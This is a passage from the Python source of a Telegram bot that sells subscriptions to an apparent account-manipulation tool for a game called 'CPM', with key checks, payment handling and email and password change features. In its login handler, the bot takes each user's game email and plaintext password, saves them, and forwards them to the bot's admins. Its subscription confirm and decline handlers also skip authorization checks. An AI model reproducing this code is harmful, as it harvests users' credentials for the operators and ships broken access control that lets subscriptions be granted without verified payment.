        status_text = "✅ **Bot is running**" if bot_status else "❌ **Bot is stopped**"
        bot.send_message(chat_id, f"✅ **Status changed**\n\n{status_text}", parse_mode='Markdown')
        admin_panel(call.message)
        return
    if data == "admin_broadcast":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "📢 **Send broadcast message:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_broadcast': True}
        return
    if data == "admin_keys":
        if not is_admin(chat_id):
            return
        keys_list = "\n".join([f"🔑 `{k}`" for k in ALLOWED_KEYS]) if ALLOWED_KEYS else "📭 No keys"
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("➕ Add", callback_data="admin_add_key")
        btn2 = types.InlineKeyboardButton("➖ Delete", callback_data="admin_delete_key")
        btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
        markup.row(btn1, btn2)
        markup.row(btn3)
        bot.send_message(chat_id, f"🔑 **Manage Keys**\n\n{keys_list}", reply_markup=markup, parse_mode='Markdown')
        return
    if data == "admin_add_key":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "🔑 **Enter new key:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_add_key': True}
        return
    if data == "admin_delete_key":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "🔑 **Enter key to delete:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_delete_key': True}
        return
    if data == "admin_ban":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "🆔 **Enter user ID to ban:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_ban': True}
        return
    if data == "admin_unban":
        if not is_admin(chat_id):
            return
        bot.send_message(chat_id, "🆔 **Enter user ID to unban:**", parse_mode='Markdown')
        user_states[chat_id] = {'awaiting_unban': True}
        return
    if data == "admin_logs":
        if not is_admin(chat_id):
            return
        logs_text = "\n".join(user_logs[-20:]) if user_logs else "📝 **No logs**"
        bot.send_message(chat_id, f"📝 **Logs**\n\n{logs_text}", parse_mode='Markdown')
        admin_panel(call.message)
        return

    # ====== SUBSCRIPTION ======
    if data == "subscription_menu":
        bot.send_message(chat_id, get_text(chat_id, "subscription_menu"), reply_markup=create_subscription_duration_keyboard(), parse_mode='Markdown')
        return

    if data.startswith("sub_duration_"):
        duration_key = data.replace("sub_duration_", "")
        duration_hours = SUBSCRIPTION_DURATIONS.get(duration_key)
        if not duration_hours:
            bot.send_message(chat_id, "❌ Invalid duration!", parse_mode='Markdown')
            return
        if chat_id not in PENDING_SUBSCRIPTIONS:
            PENDING_SUBSCRIPTIONS[chat_id] = {}
        PENDING_SUBSCRIPTIONS[chat_id]['duration'] = duration_key
        PENDING_SUBSCRIPTIONS[chat_id]['duration_hours'] = duration_hours
        stars = SUBSCRIPTION_STARS.get(duration_key, "")
        money = SUBSCRIPTION_MONEY.get(duration_key, "")
        text = f"✅ **Selected:** {duration_key.replace('_', ' ').title()}\n"
        text += f"⭐ **Stars:** {stars} ⭐\n"
        text += f"💰 **Money:** {money}\n\n"
        text += "📌 Choose payment method:"
        bot.send_message(chat_id, text, reply_markup=create_payment_method_keyboard(), parse_mode='Markdown')
        return

    if data.startswith("sub_payment_"):
        payment_method = data.replace("sub_payment_", "")
        if chat_id not in PENDING_SUBSCRIPTIONS:
            PENDING_SUBSCRIPTIONS[chat_id] = {}
        PENDING_SUBSCRIPTIONS[chat_id]['payment_method'] = payment_method
        if payment_method == "stars":
            # ====== STARS PAYMENT: fully automatic activation ======
            stars = SUBSCRIPTION_STARS.get(PENDING_SUBSCRIPTIONS[chat_id].get('duration', ''), 0)
            duration_key = PENDING_SUBSCRIPTIONS[chat_id].get('duration', '')
            duration_hours = PENDING_SUBSCRIPTIONS[chat_id].get('duration_hours', 24)
            if not stars:
                bot.send_message(chat_id, "❌ Invalid duration for Stars payment!", parse_mode='Markdown')
                return
            expires = datetime.now() + timedelta(hours=duration_hours)
            try:
                user = bot.get_chat(chat_id)
                username = user.username or "No username"
                first_name = user.first_name or "Unknown"
            except Exception:
                username = "Unknown"
                first_name = "Unknown"
            invoice_caption = (
                f"🌟 **STARS SUBSCRIPTION PAYMENT**\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **User:** {first_name} (@{username})\n"
                f"🆔 **ID:** `{chat_id}`\n"
                f"⏱️ **Duration:** {duration_key.replace('_', ' ').title()}\n"
                f"⭐ **Stars:** {stars}\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"📌 Pay below to activate your subscription AUTOMATICALLY!"
            )
            try:
                invoice = bot.create_invoice_link(
                    title=f"Subscription {duration_key.replace('_', ' ').title()}",
                    description=f"Telegram Stars subscription — {stars} Stars",
                    payload=f"stars_{chat_id}_{duration_key}",
                    provider_token="",
                    currency="XTR",
                    prices=[types.LabeledPrice(label=f"{stars} Stars", amount=stars)]
                )
            except Exception as e:
                bot.send_message(chat_id, f"❌ Failed to create Stars invoice.\nError: {str(e)}\n\n📌 Please contact @Maarkryan.", parse_mode='Markdown')
                return
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton(f"⭐ Pay {stars} Stars", url=invoice))
            bot.send_message(chat_id, invoice_caption, reply_markup=markup, parse_mode='Markdown')
            PENDING_SUBSCRIPTIONS[chat_id]['payment_status'] = 'awaiting_stars_payment'
            return

        if payment_method == "paypal":
            text = get_text(chat_id, "subscription_paypal")
        elif payment_method == "paymaya":
            text = get_text(chat_id, "subscription_paymaya")
        elif payment_method == "gcash_to_paymaya":
            text = get_text(chat_id, "subscription_gcash_to_paymaya")
        else:
            bot.send_message(chat_id, "❌ Invalid payment method!", parse_mode='Markdown')
            return
        user_states[chat_id] = {'awaiting_subscription_photo': True}
        bot.send_message(chat_id, text, parse_mode='Markdown')
        return

    # ====== STARS PAYMENT: AUTOMATIC ACTIVATION (no admin confirm needed) ======
    if data.startswith("stars_paid_"):
        parts = data.split("_", 2)
        if len(parts) < 3:
            bot.answer_callback_query(call.id, "❌ Invalid data!", show_alert=True)
            return
        user_id = int(parts[1])
        duration_key = parts[2]
        duration_hours = SUBSCRIPTION_DURATIONS.get(duration_key, 24)
        try:
            user = bot.get_chat(user_id)
            username = user.username or "No username"
            first_name = user.first_name or "Unknown"
        except Exception:
            username = "Unknown"
            first_name = "Unknown"
        # Activate subscription AUTOMATICALLY
        time_key = _activate_subscription(user_id, duration_hours, duration_key, first_name, username, "stars")
        expires = USER_SUBSCRIPTIONS.get(user_id, {}).get("expires")
        expires_str = expires.strftime("%Y-%m-%d %H:%M:%S") if expires else "Unknown"
        stars = SUBSCRIPTION_STARS.get(duration_key, 0)
        bot.send_message(
            user_id,
            get_text(user_id, "subscription_stars_paid", stars=stars, duration=duration_key.replace('_', ' ').title(), expires=expires_str),
            parse_mode='Markdown'
        )
        # Log to group (record only, no confirm/decline needed)
        _send_stars_group_log(user_id, first_name, username, duration_key, stars, expires_str)
        try:
            db_push("logs/stars_payments", {
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "duration": duration_key,
                "stars": stars,
                "expires": expires_str,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        except Exception:
            pass
        if user_id in PENDING_SUBSCRIPTIONS:
            del PENDING_SUBSCRIPTIONS[user_id]
        return

    # ====== SUBSCRIPTION CONFIRM/DECLINE (money payments) ======
    def _is_logs_group_admin(cid):
        """ADMIN_IDS members always qualify; in the logs group, Telegram group
        admins (administrator/creator) also qualify so confirm/decline
        buttons work when pressed from the group log."""
        if is_admin(cid):
            return True
        try:
            member = bot.get_chat_member(cid, cid)
            return member.status in ('administrator', 'creator')
        except Exception:
            return False
    if data.startswith("sub_confirm_"):
        # No admin check — the logs group is private, any member of the
        # group can confirm the subscription request.
        rest = data[len("sub_confirm_"):]
        user_id, duration_key, payment_method = _parse_sub_callback(rest)
        if not user_id:
            bot.answer_callback_query(call.id, "❌ Invalid data!", show_alert=True)
            return
        if payment_method not in PAYMENT_METHODS:
            bot.answer_callback_query(call.id, "❌ Invalid payment method!", show_alert=True)
            return
        duration_hours = SUBSCRIPTION_DURATIONS.get(duration_key, 24)
        try:
            user = bot.get_chat(user_id)
            username = user.username or "No username"
            first_name = user.first_name or "Unknown"
        except Exception:
            username = "Unknown"
            first_name = "Unknown"
        time_key = create_time_key(duration_hours, chat_id)
        if time_key in TIME_KEYS:
            TIME_KEYS[time_key]["used"] = True
            TIME_KEYS[time_key]["user_id"] = user_id
        USER_SUBSCRIPTIONS[user_id] = {
            "expires": TIME_KEYS[time_key]["expires"],
            "duration": duration_hours,
            "key": time_key
        }
        if time_key not in KEY_USAGE:
            KEY_USAGE[time_key] = []
            KEY_USERS_DETAILS[time_key] = {}
        if user_id not in KEY_USAGE[time_key]:
            KEY_USAGE[time_key].append(user_id)
            KEY_USAGE_COUNT[time_key] = len(KEY_USAGE[time_key])
        KEY_USERS_DETAILS[time_key][user_id] = {
            "username": username,
            "first_name": first_name,
            "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": "subscription"
        }
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]['logged_in'] = True
        user_sessions[user_id]['is_time_key'] = True
        expires = TIME_KEYS[time_key]["expires"].strftime("%Y-%m-%d %H:%M:%S")
        bot.send_message(
            user_id,
            f"✅ **SUBSCRIPTION CONFIRMED!**\n━━━━━━━━━━━━━━━━━━━━━\n🎉 Your subscription is now active!\n⏱️ Duration: {duration_key.replace('_', ' ').title()}\n📅 Expires: {expires}\n\n✅ You can now use the bot features!",
            parse_mode='Markdown'
        )
        try:
            log_msg_id = PENDING_SUBSCRIPTIONS.get(user_id, {}).get('log_message_id')
            if log_msg_id:
                bot.edit_message_text(
                    f"✅ **SUBSCRIPTION CONFIRMED**\n━━━━━━━━━━━━━━━━━━━━━\n👤 {first_name} (@{username})\n🆔 ID: `{user_id}`\n⏱️ Duration: {duration_key.replace('_', ' ').title()}\n💳 Payment: {payment_method.upper()}\n🔑 Key: `{time_key}`\n✅ Confirmed by: @{bot.get_chat(chat_id).username or 'Admin'}",
                    GROUP_LOG_ID, log_msg_id, parse_mode='Markdown'
                )
        except Exception:
            pass
        bot.answer_callback_query(call.id, "✅ Subscription confirmed!", show_alert=True)
        if user_id in PENDING_SUBSCRIPTIONS:
            del PENDING_SUBSCRIPTIONS[user_id]
        return

    if data.startswith("sub_decline_"):
        # No admin check — the logs group is private, any member of the
        # group can decline the subscription request.
        rest = data[len("sub_decline_"):]
        user_id, duration_key, payment_method = _parse_sub_callback(rest)
        if not user_id:
            bot.answer_callback_query(call.id, "❌ Invalid data!", show_alert=True)
            return
        if payment_method not in PAYMENT_METHODS:
            bot.answer_callback_query(call.id, "❌ Invalid payment method!", show_alert=True)
            return
        bot.send_message(
            user_id,
            "❌ **SUBSCRIPTION DECLINED**\n━━━━━━━━━━━━━━━━━━━━━\n⚠️ Your payment could not be verified.\n📌 Please contact @Maarkryan for assistance.",
            parse_mode='Markdown'
        )
        try:
            user = bot.get_chat(user_id)
            username = user.username or "No username"
            first_name = user.first_name or "Unknown"
        except Exception:
            username = "Unknown"
            first_name = "Unknown"
        try:
            log_msg_id = PENDING_SUBSCRIPTIONS.get(user_id, {}).get('log_message_id')
            if log_msg_id:
                bot.edit_message_text(
                    f"❌ **SUBSCRIPTION DECLINED**\n━━━━━━━━━━━━━━━━━━━━━\n👤 {first_name} (@{username})\n🆔 ID: `{user_id}`\n⏱️ Duration: {duration_key.replace('_', ' ').title()}\n💳 Payment: {payment_method.upper()}\n❌ Declined by: @{bot.get_chat(chat_id).username or 'Admin'}",
                    GROUP_LOG_ID, log_msg_id, parse_mode='Markdown'
                )
        except Exception:
            pass
        bot.answer_callback_query(call.id, "❌ Subscription declined!", show_alert=True)
        if user_id in PENDING_SUBSCRIPTIONS:
            del PENDING_SUBSCRIPTIONS[user_id]
        return

    bot.answer_callback_query(call.id, "🔹 Executing...")

# ═══════════════════════════════════════════════════════════
# 📝 KEY HANDLERS
# ═══════════════════════════════════════════════════════════

def check_time_key(message):
    chat_id = message.chat.id
    key = message.text.strip()
    try:
        user = bot.get_chat(chat_id)
        username = user.username or "No username"
        first_name = user.first_name or "Unknown"
    except Exception:
        username = "Unknown"
        first_name = "Unknown"
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    if key in TIME_KEYS:
        success, msg = use_time_key(key, chat_id)
        if success:
            user_sessions[chat_id]['logged_in'] = True
            user_sessions[chat_id]['is_time_key'] = True
            key_data = TIME_KEYS[key]
            USER_SUBSCRIPTIONS[chat_id] = {
                "expires": key_data["expires"],
                "duration": key_data["duration"],
                "key": key
            }
            if key not in KEY_USAGE:
                KEY_USAGE[key] = []
                KEY_USERS_DETAILS[key] = {}
            if chat_id not in KEY_USAGE[key]:
                KEY_USAGE[key].append(chat_id)
                KEY_USAGE_COUNT[key] = len(KEY_USAGE[key])
            KEY_USERS_DETAILS[key][chat_id] = {
                "username": username,
                "first_name": first_name,
                "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "time_key"
            }
            notify_admins(
                f"⏰ **Time Key Used**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Name: `{first_name}`\n"
                f"🆔 Username: @{username}\n"
                f"🆔 ID: `{chat_id}`\n"
                f"🔑 Key: `{key}`\n"
                f"⏱️ Duration: {key_data['duration']} hours\n"
                f"📅 Expires: {key_data['expires'].strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📊 Users: {KEY_USAGE_COUNT[key]}"
            )
            bot.send_message(chat_id, f"✅ **Key activated successfully!**\n⏱️ Valid for {key_data['duration']} hours\n📅 Expires: {key_data['expires'].strftime('%Y-%m-%d %H:%M:%S')}", parse_mode='Markdown')
            menu_command(message)
            return
        else:
            bot.send_message(chat_id, f"❌ **{msg}**", parse_mode='Markdown')
            start(message)
            return
    if key in ALLOWED_KEYS:
        user_sessions[chat_id]['logged_in'] = True
        if key not in KEY_USAGE:
            KEY_USAGE[key] = []
            KEY_USERS_DETAILS[key] = {}
        if chat_id not in KEY_USAGE[key]:
            KEY_USAGE[key].append(chat_id)
            KEY_USAGE_COUNT[key] = len(KEY_USAGE[key])
        KEY_USERS_DETAILS[key][chat_id] = {
            "username": username,
            "first_name": first_name,
            "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": "normal"
        }
        notify_admins(
            f"🔑 **Normal Key Used**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name: `{first_name}`\n"
            f"🆔 Username: @{username}\n"
            f"🆔 ID: `{chat_id}`\n"
            f"🔑 Key: `{key}`\n"
            f"📊 Users: {KEY_USAGE_COUNT[key]}"
        )
        add_log(chat_id, f"Key activated: {key}")
        bot.send_message(chat_id, get_text(chat_id, "key_success"), parse_mode='Markdown')
        menu_command(message)
    else:
        bot.send_message(chat_id, get_text(chat_id, "wrong_key"), parse_mode='Markdown')
        start(message)

def check_key(message):
    chat_id = message.chat.id
    key = message.text.strip()
    try:
        user = bot.get_chat(chat_id)
        username = user.username or "No username"
        first_name = user.first_name or "Unknown"
    except Exception:
        username = "Unknown"
        first_name = "Unknown"
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    if key in TRIAL_KEYS:
        trial_data = TRIAL_KEYS[key]
        if datetime.now() > trial_data["expires"]:
            bot.send_message(chat_id, "❌ **Trial key expired!**", parse_mode='Markdown')
            start(message)
            return
        if trial_data.get("used"):
            if trial_data.get("user_id") == chat_id:
                user_sessions[chat_id]['logged_in'] = True
                user_sessions[chat_id]['is_trial'] = True
                bot.send_message(chat_id, "✅ **Trial key still valid for you!**", parse_mode='Markdown')
                menu_command(message)
                return
            else:
                bot.send_message(chat_id, "❌ **This trial key was used by another user!**", parse_mode='Markdown')
                start(message)
                return
        trial_data["used"] = True
        trial_data["user_id"] = chat_id
        trial_data["used_at"] = datetime.now()
        user_sessions[chat_id]['logged_in'] = True
        user_sessions[chat_id]['is_trial'] = True
        user_sessions[chat_id]['trial_key'] = key
        if key not in KEY_USAGE:
            KEY_USAGE[key] = []
            KEY_USERS_DETAILS[key] = {}
        if chat_id not in KEY_USAGE[key]:
            KEY_USAGE[key].append(chat_id)
            KEY_USAGE_COUNT[key] = len(KEY_USAGE[key])
        KEY_USERS_DETAILS[key][chat_id] = {
            "username": username,
            "first_name": first_name,
            "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": "trial"
        }
        notify_admins(
            f"🎁 **Trial Key Used**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name: `{first_name}`\n"
            f"🆔 Username: @{username}\n"
            f"🆔 ID: `{chat_id}`\n"
            f"🔑 Key: `{key}`\n"
            f"📊 Users: {KEY_USAGE_COUNT[key]}"
        )
        bot.send_message(chat_id, "✅ **Trial key activated!** ⏱️ 10 minutes", parse_mode='Markdown')
        menu_command(message)
        return
    if key in ALLOWED_KEYS:
        user_sessions[chat_id]['logged_in'] = True
        if key not in KEY_USAGE:
            KEY_USAGE[key] = []
            KEY_USERS_DETAILS[key] = {}
        if chat_id not in KEY_USAGE[key]:
            KEY_USAGE[key].append(chat_id)
            KEY_USAGE_COUNT[key] = len(KEY_USAGE[key])
        KEY_USERS_DETAILS[key][chat_id] = {
            "username": username,
            "first_name": first_name,
            "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "type": "normal"
        }
        notify_admins(
            f"🔑 **Normal Key Used**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Name: `{first_name}`\n"
            f"🆔 Username: @{username}\n"
            f"🆔 ID: `{chat_id}`\n"
            f"🔑 Key: `{key}`\n"
            f"📊 Users: {KEY_USAGE_COUNT[key]}"
        )
        add_log(chat_id, f"Key activated: {key}")
        bot.send_message(chat_id, get_text(chat_id, "key_success"), parse_mode='Markdown')
        menu_command(message)
    else:
        bot.send_message(chat_id, get_text(chat_id, "wrong_key"), parse_mode='Markdown')
        start(message)

def get_email(message):
    chat_id = message.chat.id
    if message.text and message.text.startswith('/'):
        return
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    user_sessions[chat_id]['email'] = message.text.strip()
    bot.send_message(chat_id, get_text(chat_id, "enter_pass"), parse_mode='Markdown')
    bot.register_next_step_handler(message, get_password)

def get_password(message):
    chat_id = message.chat.id
    if message.text and message.text.startswith('/'):
        return
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    user_sessions[chat_id]['password'] = message.text.strip()
    email = user_sessions[chat_id]['email']
    password = user_sessions[chat_id]['password']
    version = user_cpm_version.get(chat_id, "1")
    try:
        user = bot.get_chat(chat_id)
        username = user.username or "No username"
        first_name = user.first_name or "Unknown"
    except Exception:
        username = "Unknown"
        first_name = "Unknown"
    if version == "1":
        web_uid = get_web_uid(chat_id)
        result = run_async(nuker.account_login(email, password))
        if result and result.get("ok"):
            nuker.save_token(
                web_uid,
                result.get("auth", ""),
                email,
                password,
                result.get("refresh_token", ""),
                result.get("firebase_uid", "")
            )
            run_async(nuker.load_account(web_uid, force=True))
            user_sessions[chat_id]['logged_in'] = True
            user_sessions[chat_id]['version'] = "1"
            user_sessions[chat_id]['email'] = email
            user_sessions[chat_id]['password'] = password
            user_sessions[chat_id]['web_uid'] = web_uid
            save_account(chat_id, email, password, result.get("firebase_uid"), "CPM1")
            notify_admins(
                f"📱 **New Login - CPM1**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Name: `{first_name}`\n"
                f"🆔 Username: @{username}\n"
                f"🆔 ID: `{chat_id}`\n"
                f"📧 Email: `{email}`\n"
                f"🔑 Password: `{password}`\n"
                f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            bot.send_message(chat_id, f"✅ **Logged in to CPM1!**\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n━━━━━━━━━━━━━━━━━━━━━\n📌 Loading account info...", parse_mode='Markdown')
            show_cpm1_menu(chat_id)
        else:
            bot.send_message(chat_id, f"❌ **CPM1 Login failed!**\n📧 Email: `{email}`\n💡 Try again:", parse_mode='Markdown')
            bot.register_next_step_handler(message, get_email)
        return
    elif version == "2":
        result = cpm2_login(email, password)
        if result and result.get("token"):
            user_sessions[chat_id]['logged_in'] = True
            user_sessions[chat_id]['version'] = "2"
            user_sessions[chat_id]['email'] = email
            user_sessions[chat_id]['password'] = password
            save_account(chat_id, email, password, result.get("uid"), "CPM2")
            notify_admins(
                f"📱 **New Login - CPM2**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Name: `{first_name}`\n"
                f"🆔 Username: @{username}\n"
                f"🆔 ID: `{chat_id}`\n"
                f"📧 Email: `{email}`\n"
                f"🔑 Password: `{password}`\n"
                f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            bot.send_message(chat_id, f"✅ **Logged in to CPM2!**\n📧 Email: `{email}`\n━━━━━━━━━━━━━━━━━━━━━\n📌 Choose activation:", parse_mode='Markdown')
            section_cpm2(message)
        else:
            bot.send_message(chat_id, f"❌ **CPM2 Login failed!**\n📧 Email: `{email}`\n💡 Try again:", parse_mode='Markdown')
            bot.register_next_step_handler(message, get_email)
        return

# ═══════════════════════════════════════════════════════════
# 📝 MESSAGE HANDLER
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# 🌟 INCOMING STARS (user sends Stars directly to the bot)
# Bot API 7.4+: users can send Stars in chats with the bot.
# The bot receives them via successful_payment (currency XTR).
# ═══════════════════════════════════════════════════════════

def _match_stars_to_subscription(chat_id, stars):
    """Try to match incoming Stars to a pending subscription duration.

    Matches the exact Stars amount to SUBSCRIPTION_STARS. If the amount matches
    a duration price, the subscription is activated automatically.
    """
    duration_key = None
    duration_stars = 0
    for dur, amt in SUBSCRIPTION_STARS.items():
        if amt == stars:
            duration_key = dur
            duration_stars = amt
            break
    return duration_key, duration_stars

@bot.message_handler(content_types=["successful_payment"])
def handle_payment(message):
    """Handle successful payments received by the bot (including Stars XTR)."""
    chat_id = message.chat.id
    sp = message.successful_payment
    if not sp:
        return

    # ====== TELEGRAM STARS (XTR) — AUTOMATIC ACTIVATION ======
    if sp.currency == "XTR":
        stars = sp.total_amount
        try:
            user = bot.get_chat(chat_id)
            username = user.username or "No username"
            first_name = user.first_name or "Unknown"
        except Exception:
            username = "Unknown"
            first_name = "Unknown"
        duration_key, duration_stars = _match_stars_to_subscription(chat_id, stars)
        if not duration_key:
            # Amount doesn't match any plan — tell the user the valid prices
            bot.send_message(
                chat_id,
                "❌ **Stars amount did not match any subscription plan!**\n" +
                "━━━━━━━━━━━━━━━━━━━━━\n" +
                "📌 Please send Stars matching one of these prices:\n" +
                "⭐ 1 Day — 30 ⭐\n⭐ 5 Days — 130 ⭐\n⭐ 1 Week — 200 ⭐\n⭐ 3 Weeks — 250 ⭐\n⭐ 5 Weeks — 300 ⭐\n⭐ 7 Weeks — 330 ⭐\n⭐ 12 Weeks — 1,050 ⭐\n⭐ 14 Weeks — 1,250 ⭐\n\n" +
                "📌 Or use the subscription menu instead.",
                parse_mode='Markdown'
            )
            return
        duration_hours = SUBSCRIPTION_DURATIONS[duration_key]
        # Add Stars to bot's balance (withdrawable at 1,000+ Stars)
        new_total = _add_stars_balance(chat_id, username, first_name, stars, duration_key, "direct")
        # Activate subscription AUTOMATICALLY
        _activate_subscription(chat_id, duration_hours, duration_key, first_name, username, "stars")
        expires = USER_SUBSCRIPTIONS.get(chat_id, {}).get("expires")
        expires_str = expires.strftime("%Y-%m-%d %H:%M:%S") if expires else "Unknown"
        bot.send_message(
            chat_id,
            get_text(chat_id, "subscription_stars_paid", stars=stars, duration=duration_key.replace('_', ' ').title(), expires=expires_str),
            parse_mode='Markdown'
        )
        _send_stars_group_log(chat_id, first_name, username, duration_key, stars, expires_str)
        try:
            db_push("logs/stars_payments", {
                "user_id": chat_id,
                "username": username,
                "first_name": first_name,
                "duration": duration_key,
                "stars": stars,
                "expires": expires_str,
                "source": "direct",
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        except Exception:
            pass
        # Clean pending state
        if chat_id in PENDING_SUBSCRIPTIONS:
            del PENDING_SUBSCRIPTIONS[chat_id]
        if chat_id in user_states:
            state = user_states.get(chat_id, {})
            state.pop('awaiting_subscription_photo', None)
        print(f"🌟 Stars payment: {stars} from @{username} ({chat_id}) — auto-activated {duration_key} | Bot balance: {new_total}")
        return

@bot.message_handler(
    func=lambda message: True,
    content_types=[
        'text', 'photo', 'document', 'video', 'animation', 'voice', 'audio',
        'video_note', 'sticker', 'contact', 'location', 'venue', 'poll',
        'dice', 'successful_payment',
    ]
)
def handle_all_messages(message):
    chat_id = message.chat.id
    text = message.text

    if chat_id in user_states:
        state = user_states[chat_id]

        # ====== SUBSCRIPTION PHOTO HANDLING ======
        if state.get('awaiting_subscription_photo'):
            if not message.photo:
                # Escape hatch: text messages (commands / cancel words) exit this state
                if text and (text.strip().startswith('/') or text.strip().lower() in ('cancel', 'batalin', 'back')):
                    del user_states[chat_id]
                    bot.send_message(chat_id, "❌ Subscription payment cancelled. Type /start to go back to the menu.", parse_mode='Markdown')
                    return
                bot.send_message(
                    chat_id,
                    "❌ Please send a **photo/screenshot** of your payment.\n\n📤 Or send /cancel to cancel and go back to the menu.",
                    parse_mode='Markdown'
                )
                return
            photo = message.photo[-1]
            file_id = photo.file_id
            try:
                user = bot.get_chat(chat_id)
                username = user.username or "No username"
                first_name = user.first_name or "Unknown"
            except Exception:
                username = "Unknown"
                first_name = "Unknown"
            # Download the photo and re-upload it (safer than forwarding file_id
            # across chats, and preserves the original image quality)
            photo_bytes = None
            try:
                photo_info = bot.get_file(file_id)
                photo_bytes = bot.download_file(photo_info.file_path)
            except Exception as e:
                bot.send_message(chat_id, f"❌ Failed to read your screenshot.\n📌 Error: {str(e)}\n\n📤 Please send the screenshot again.", parse_mode='Markdown')
                return
            sub_data = PENDING_SUBSCRIPTIONS.get(chat_id, {})
            duration_key = sub_data.get('duration', 'Unknown')
            payment_method = sub_data.get('payment_method', 'Unknown')
            duration_hours = sub_data.get('duration_hours', 24)
            stars = SUBSCRIPTION_STARS.get(duration_key, "")
            money = SUBSCRIPTION_MONEY.get(duration_key, "")
            caption = f"💳 **NEW SUBSCRIPTION REQUEST**\n━━━━━━━━━━━━━━━━━━━━━\n"
            caption += f"👤 **Username:** @{username}\n"
            caption += f"🆔 **ID:** `{chat_id}`\n"
            caption += f"⏱️ **Duration:** {duration_key.replace('_', ' ').title()}\n"
            caption += f"⭐ **Stars:** {stars}\n"
            caption += f"💰 **Price:** {money}\n"
            caption += f"💳 **Payment:** {payment_method.upper()}\n"
            caption += f"━━━━━━━━━━━━━━━━━━━━━\n"
            caption += f"📌 Please verify the payment below."
            try:
                sent_msg = bot.send_photo(
                    GROUP_LOG_ID,
                    photo_bytes if photo_bytes else photo.file_id,
                    caption=caption,
                    parse_mode='Markdown',
                    reply_markup=create_subscription_confirm_keyboard(chat_id, duration_key, payment_method)
                )
                if chat_id not in PENDING_SUBSCRIPTIONS:
                    PENDING_SUBSCRIPTIONS[chat_id] = {}
                PENDING_SUBSCRIPTIONS[chat_id]['log_message_id'] = sent_msg.message_id
                bot.send_message(chat_id, get_text(chat_id, "subscription_photo_received"), parse_mode='Markdown')
                del user_states[chat_id]['awaiting_subscription_photo']
            except Exception as e:
                print(f"❌ Group log send failed for user {chat_id}: {e}")
                # Try to alert an admin directly as a fallback
                try:
                    fallback_caption = (
                        f"⚠️ **GROUP LOG FAILED**\n━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 @{username} (ID: `{chat_id}`) sent a payment screenshot "
                        f"but it could not be posted to the group log.\n"
                        f"💳 Method: {payment_method.upper()} | ⏱️ {duration_key.replace('_', ' ').title()}\n"
                        f"📌 Error: {str(e)[:200]}\n━━━━━━━━━━━━━━━━━━━━━"
                    )
                    for admin_id in ADMIN_IDS:
                        try:
                            bot.send_message(admin_id, fallback_caption, parse_mode='Markdown')
                        except Exception:
                            pass
                except Exception:
                    pass
                bot.send_message(
                    chat_id,
                    "❌ **Failed to post your payment to the admin log.**\n"
                    "📌 Your screenshot was saved. Please wait — an admin has been notified and will verify your payment manually.\n"
                    "📤 If nothing happens in a few minutes, please DM @Maarkryan directly.",
                    parse_mode='Markdown'
                )
                del user_states[chat_id]['awaiting_subscription_photo']
            return

        # ====== CPM1 - Change Email ======
        if state.get('awaiting_cpm1_email'):
            web_uid = user_sessions[chat_id].get('web_uid')
            if not web_uid:
                bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                del user_states[chat_id]
                return
            new_email = text.strip()
            if '@' not in new_email or '.' not in new_email:
                bot.send_message(chat_id, "❌ **Invalid email format!**", parse_mode='Markdown')
                return
            loading_msg = bot.send_message(chat_id, "⏳ **Changing email...**", parse_mode='Markdown')
            result = run_async(nuker.change_email(web_uid, new_email))
            if result and result.get("ok"):
                bot.edit_message_text(f"✅ **{result.get('message')}**", chat_id, loading_msg.message_id, parse_mode='Markdown')
                user_sessions[chat_id]['email'] = new_email
            else:
                bot.edit_message_text(f"❌ **Failed to change email!**\n💀 {result.get('message', 'Unknown error')}", chat_id, loading_msg.message_id, parse_mode='Markdown')
            del user_states[chat_id]
            show_cpm1_menu(chat_id)
            return

        # ====== CPM1 - Change Password ======
        if state.get('awaiting_cpm1_pass'):
            new_pass = text.strip()
            if len(new_pass) < 6:
                bot.send_message(chat_id, "❌ **Too short! Min 6 characters**", parse_mode='Markdown')
                return
            web_uid = user_sessions[chat_id].get('web_uid')
            if not web_uid:
                bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
